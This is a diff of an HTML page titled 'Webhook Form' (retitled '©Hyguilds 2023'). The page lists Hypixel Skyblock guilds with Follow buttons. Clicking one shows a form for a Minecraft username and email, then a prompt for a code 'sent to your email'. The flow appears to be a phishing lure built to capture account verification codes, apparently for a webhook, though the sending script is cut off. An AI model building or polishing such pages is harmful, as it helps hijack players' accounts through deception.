@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Webhook Form</title>
+  <title>©Hyguilds 2023</title>
   <style>
     body {
       background-color: #f2f2f2;
@@ -9,106 +9,115 @@
       margin: 0;
       padding: 20px;
     }
-h1 {
-  color: #333;
-  text-align: center;
-}
 
-form {
-  background-color: #fff;
-  border-radius: 8px;
-  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-  padding: 20px;
-  max-width: 500px;
-  margin: 0 auto;
-}
+    h1 {
+      color: #333;
+      text-align: center;
+    }
 
-input[type="text"],
-input[type="email"],
-input[type="submit"] {
-  border: 1px solid #ddd;
-  border-radius: 4px;
-  padding: 8px;
-  width: 100%;
-}
+    .container {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      grid-gap: 20px;
+    }
 
-input[type="submit"] {
-  background-color: #333;
-  border: none;
-  border-radius: 4px;
-  color: #fff;
-  cursor: pointer;
-  padding: 10px 20px;
-  transition: background-color 0.3s;
-}
+    .guild-box {
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
 
-input[type="submit"]:hover {
-  background-color: #555;
-}
+    .guild-box:hover {
+      transform: scale(1.05);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
 
-#signInGuildList {
-  margin-top: 20px;
-  display: flex;
-  overflow-x: auto;
-  white-space: nowrap;
-  animation: scroll 30s linear infinite;
-}
+    .guild-box h3 {
+      color: #333;
+      margin: 0;
+    }
 
-@keyframes scroll {
-  0% {
-    transform: translateX(0%);
-  }
-  100% {
-    transform: translateX(-100%);
-  }
-}
+    .guild-box p {
+      color: #666;
+      margin: 0;
+    }
 
-.guild-box {
-  background-color: #fff;
-  border-radius: 8px;
-  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-  padding: 20px;
-  margin-right: 10px;
-  min-width: 200px;
-  max-width: 300px;
-}
+    .follow-button {
+      background-color: #ff5a5f;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      cursor: pointer;
+      padding: 8px 16px;
+      font-size: 14px;
+      transition: background-color 0.3s;
+      display: block;
+      margin: 10px auto;
+    }
 
-.guild-box h3 {
-  color: #333;
-  margin: 0;
-}
+    .follow-button:hover {
+      background-color: #e5373b;
+    }
 
-.guild-box p {
-  color: #666;
-  margin: 0;
-}
+    .follow-button:focus {
+      outline: none;
+      box-shadow: 0 0 0 2px #e5373b;
+    }
 
-.follow-button {
-  background-color: #ff5a5f;
-  border: none;
-  border-radius: 4px;
-  color: #fff;
-  cursor: pointer;
-  padding: 8px 16px;
-  font-size: 14px;
-  transition: background-color 0.3s;
-  display: block;
-  margin: 10px auto;
-}
+    #signInGuildList {
+      margin-top: 20px;
+      display: flex;
+      overflow-x: auto;
+      white-space: nowrap;
+      animation: scroll 30s linear infinite;
+    }
 
-.follow-button:hover {
-  background-color: #e5373b;
-}
+    @keyframes scroll {
+      0% {
+        transform: translateX(0%);
+      }
+      100% {
+        transform: translateX(-100%);
+      }
+    }
 
-.follow-button:focus {
-  outline: none;
-  box-shadow: 0 0 0 2px #e5373b;
-}
+    #emailForm,
+    #codeFormContainer {
+      max-width: 400px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+
+    #codeFormContainer {
+      display: none;
+    }
+
+    #codeFormContainer h2 {
+      text-align: center;
+    }
+
+    #codeFormContainer p {
+      text-align: center;
+    }
+
+    #codeFormContainer form {
+      margin-top: 20px;
+    }
+
+    #codeFormContainer input[type="submit"] {
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
   <h1>Webhook Form</h1>
-  <div id="signInGuildList">
+
+  <div class="container">
     <div class="guild-box">
       <h3>Flexing Chimps</h3>
       <p>Highest Networth guild in all of Skyblock. /g discord (300 Level Requirement)</p>
@@ -152,6 +161,7 @@ input[type="submit"]:hover {
       <button class="follow-button" onclick="followGuild(7)">Follow</button>
     </div>
   </div>
+
   <form id="emailForm" style="display: none;">
     <label for="username">Minecraft Username:</label>
     <input type="text" id="username" name="username" required><br><br>
@@ -159,6 +169,7 @@ input[type="submit"]:hover {
     <input type="email" id="email" name="email" required><br><br>
     <input type="submit" value="Send Email">
   </form>
+
   <div id="codeFormContainer" style="display: none;">
     <h2>Enter Code</h2>
     <p>A code has been sent to your email.</p>
@@ -168,6 +179,7 @@ input[type="submit"]:hover {
       <input type="submit" value="Submit Code">
     </form>
   </div>
+
   <script>
     function followGuild(guildId) {
       // Hide the guild list and show the email form
